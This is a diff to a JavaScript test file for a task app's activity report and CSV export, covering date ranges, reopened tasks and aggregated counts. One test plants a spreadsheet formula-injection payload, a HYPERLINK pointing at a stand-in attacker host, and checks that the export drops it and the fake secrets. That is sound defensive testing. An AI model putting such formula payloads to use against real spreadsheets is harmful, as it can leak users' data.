@@ -3,7 +3,7 @@ import assert from "node:assert/strict";
 import { readFileSync } from "node:fs";
 import {
   TASK_STATES, createTask, addTask, transitionTask, retryTask, recoverInterruptedTasks,
-  actionPolicy, createActionProposal, getChecklistProgress, setChecklistStepChecked, summarizeTaskQueue, filterTaskQueue, taskDashboardCategory, searchAndSortTaskQueue, getTaskSchedule, setTaskSchedule, localCalendarDate, taskDueState, summarizeTaskDeadlines, filterTaskDeadlines, createTaskQueueBackup, readTaskQueueBackup, mergeTaskQueueBackup, getTaskAnnotations, setTaskAnnotations, MAX_TASK_TEMPLATES, createTaskTemplate, readTaskTemplates, addTaskTemplate, createTaskFromTemplate, summarizeTaskAnalytics
+  actionPolicy, createActionProposal, getChecklistProgress, setChecklistStepChecked, summarizeTaskQueue, filterTaskQueue, taskDashboardCategory, searchAndSortTaskQueue, getTaskSchedule, setTaskSchedule, localCalendarDate, taskDueState, summarizeTaskDeadlines, filterTaskDeadlines, createTaskQueueBackup, readTaskQueueBackup, mergeTaskQueueBackup, getTaskAnnotations, setTaskAnnotations, MAX_TASK_TEMPLATES, createTaskTemplate, readTaskTemplates, addTaskTemplate, createTaskFromTemplate, summarizeTaskAnalytics, summarizeTaskActivityReport, createTaskActivityCsv
 } from "../src/task-engine.js";
 
 test("creates bounded queued tasks", () => {
@@ -761,4 +761,78 @@ test("JOMY 3.0 seven-day analytics use local calendar boundaries across month an
   assert.equal(a.last7Completed,1);
   assert.equal(a.days[5].completed,1);
   assert.equal(a.todayCreated,1);
+});
+
+
+test("JOMY 3.1 report supports empty 7/30-day ranges without invented activity", () => {
+  const now=new Date(2026,10,19,12);
+  const a=summarizeTaskActivityReport([],7,now);
+  const b=summarizeTaskActivityReport([],30,now);
+  assert.deepEqual([a.created,a.manuallyDone,a.bestDay],[0,0,null]);
+  assert.equal(a.rows.length,7);
+  assert.equal(b.rows.length,30);
+  assert.equal(a.periodStart,"2026-11-13");
+  assert.equal(b.periodStart,"2026-10-21");
+  assert.equal(a.periodEnd,"2026-11-19");
+  assert.deepEqual(summarizeTaskActivityReport(null,7,now),a);
+  assert.throws(()=>summarizeTaskActivityReport([],14,now),/Report range/);
+  assert.throws(()=>summarizeTaskActivityReport([],7,"bad"),/Invalid report date/);
+});
+
+test("JOMY 3.1 7 vs 30 day counts use actual current DONE tasks only", () => {
+  const stamp=(m,d)=>new Date(2026,m,d,12).toISOString();
+  const tasks=[
+    {id:"old",title:"Older",createdAt:stamp(9,29),status:TASK_STATES.READY},
+    {id:"week",title:"This week",createdAt:stamp(10,18),status:TASK_STATES.READY},
+    {id:"month",title:"Monthly",createdAt:stamp(9,25),status:TASK_STATES.DONE,manualCompletedAt:stamp(10,17)},
+    {id:"today",title:"Today",createdAt:stamp(10,19),status:TASK_STATES.DONE,manualCompletedAt:stamp(10,19)},
+    {id:"reopened",title:"Reopened",createdAt:stamp(10,16),status:TASK_STATES.READY,manualCompletedAt:stamp(10,18)},
+    {id:"success",title:"Legacy succeeded",createdAt:stamp(10,17),status:TASK_STATES.SUCCEEDED},
+    {id:"undated",title:"Old DONE",createdAt:stamp(10,15),status:TASK_STATES.DONE}
+  ];
+  const original=JSON.stringify(tasks);
+  const seven=summarizeTaskActivityReport(tasks,7,new Date(2026,10,19,18));
+  const thirty=summarizeTaskActivityReport(tasks,30,new Date(2026,10,19,18));
+  assert.equal(seven.created,5);
+  assert.equal(thirty.created,7);
+  assert.equal(seven.manuallyDone,2);
+  assert.equal(thirty.manuallyDone,2);
+  assert.deepEqual(seven.bestDay,{date:"2026-11-19",manuallyDone:1});
+  assert.equal(seven.rows[6].manuallyDone,1);
+  assert.equal(seven.rows[6].created,1);
+  assert.equal(JSON.stringify(tasks),original);
+});
+
+test("JOMY 3.1 CSV includes only dates and aggregated numbers, never task private content", () => {
+  const secret="=HYPERLINK(\"https://attacker.example\",\"token\")";
+  const task={id:"x",title:secret,status:TASK_STATES.DONE,
+    createdAt:new Date(2026,10,19,9).toISOString(),
+    manualCompletedAt:new Date(2026,10,19,10).toISOString(),
+    note:"SECRET_PRIVATE_NOTE",tags:["SECRET_PRIVATE_TAG"],ownerToken:"SECRET_OWNER_TOKEN"};
+  const csv=createTaskActivityCsv([task],7,new Date(2026,10,19,12));
+  assert.ok(csv.startsWith("Date,Created,Manually Done\r\n"));
+  assert.equal(csv.trim().split("\r\n").length,8);
+  assert.match(csv,/2026-11-19,1,1/);
+  assert.doesNotMatch(csv,/HYPERLINK|attacker|SECRET|ownerToken|PRIVATE|note|tags/);
+  assert.match(csv,/^(?:Date,Created,Manually Done|\d{4}-\d{2}-\d{2},\d+,\d+)\r?\n(?:\d{4}-\d{2}-\d{2},\d+,\d+\r?\n){6}$/);
+});
+
+test("JOMY 3.1 report reverses completion when task is reopened", () => {
+  const now=new Date(2026,10,19,13).getTime();
+  const open={...createTask("Manual",now),status:TASK_STATES.READY};
+  const done=transitionTask(open,TASK_STATES.DONE,{},now+1000);
+  assert.equal(summarizeTaskActivityReport([done],7,new Date(now+2000)).manuallyDone,1);
+  const reopened=transitionTask(done,TASK_STATES.READY,{},now+3000);
+  assert.equal(summarizeTaskActivityReport([reopened],7,new Date(now+4000)).manuallyDone,0);
+  assert.equal(reopened.manualCompletedAt,undefined);
+  assert.equal(summarizeTaskActivityReport([reopened],7,new Date(now+4000)).created,1);
+});
+
+test("JOMY 3.1 report calendar crosses New Year without UTC-day guessing", () => {
+  const now=new Date(2027,0,2,12);
+  const report=summarizeTaskActivityReport([],7,now);
+  assert.deepEqual(report.rows.map(x=>x.date),[
+    "2026-12-27","2026-12-28","2026-12-29","2026-12-30",
+    "2026-12-31","2027-01-01","2027-01-02"
+  ]);
 });
